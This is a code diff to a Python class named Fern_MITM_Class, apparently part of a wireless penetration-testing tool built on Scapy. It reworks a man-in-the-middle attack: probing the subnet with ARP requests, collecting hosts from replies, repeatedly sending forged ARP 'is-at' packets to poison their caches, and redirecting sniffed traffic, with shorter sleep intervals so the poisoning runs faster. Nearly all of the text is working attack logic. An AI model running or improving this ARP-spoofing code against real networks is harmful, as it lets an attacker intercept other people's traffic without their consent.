@@ -108,24 +108,22 @@ class Fern_MITM_Class:
                 for address in address_func(self.gateway_IP_address):
                     if not self.control:
                         return
-                    time.sleep(0.01)
                     packet = self.ARP_Who_Has(address)
                     sendp(packet,iface = self.interface_card)               # Send Who has packet to all hosts on subnet
 
-                time.sleep(60)
+                time.sleep(30)
 
 
 
-        def _get_Network_Hosts_Worker(self,reply,packet_count):
+        def _get_Network_Hosts_Worker(self,reply):
             '''thread worker for the _get_Netword_Host method'''
             self.semaphore.acquire()
             try:
-                for packet in xrange(packet_count):
-                    if(reply[packet].haslayer(ARP)):
-                        if((reply[packet].op == 0x2) and (reply[packet].hwdst != self._local_mac)):
-                            if not self.subnet_hosts.has_key(reply[packet].hwsrc):
-                                if(str(reply[packet].hwsrc) != str(self._gateway_MAC_addr)):
-                                    self.subnet_hosts[reply[packet].psrc] = reply[packet].hwsrc
+                if(reply.haslayer(ARP)):
+                    if((reply.op == 0x2) and (reply.hwsrc != self._local_mac)):
+                        if not self.subnet_hosts.has_key(reply.hwsrc):
+                            if(str(reply.hwsrc) != str(self._gateway_MAC_addr)):
+                                self.subnet_hosts[reply.psrc] = reply.hwsrc
             finally:
                 self.semaphore.release()
 
@@ -133,11 +131,9 @@ class Fern_MITM_Class:
         def _get_Network_Hosts(self):
             '''Receives ARP is-at from Hosts on
                 the subnet'''
-            packet_count = 10
+            packet_count = 1
             thread.start_new_thread(self._network_Hosts_Probe,())
-            while(self.control):
-                reply = sniff(filter = "arp",count = packet_count)
-                thread.start_new_thread(self._get_Network_Hosts_Worker,(reply,packet_count))
+            sniff(filter = "arp",prn = self._get_Network_Hosts_Worker)
 
 
         def _poison_arp_cache(self):
@@ -146,7 +142,7 @@ class Fern_MITM_Class:
                 for ip_address in self.subnet_hosts.keys():
                     packet = self.ARP_Is_At(ip_address,self.subnet_hosts[ip_address])
                     sendp(packet,iface = self.interface_card)
-                time.sleep(10)
+                time.sleep(5)
 
 
         def _redirect_network_traffic_worker(self,routed_data):
@@ -163,9 +159,7 @@ class Fern_MITM_Class:
 
         def _redirect_network_traffic(self):
             '''Redirect traffic to the Gateway Address'''
-            while(self.control):
-                routed_data = sniff(count = 1)[0]
-                thread.start_new_thread(self._redirect_network_traffic_worker,(routed_data,))
+            sniff(prn = self._redirect_network_traffic_worker)
 
 
 
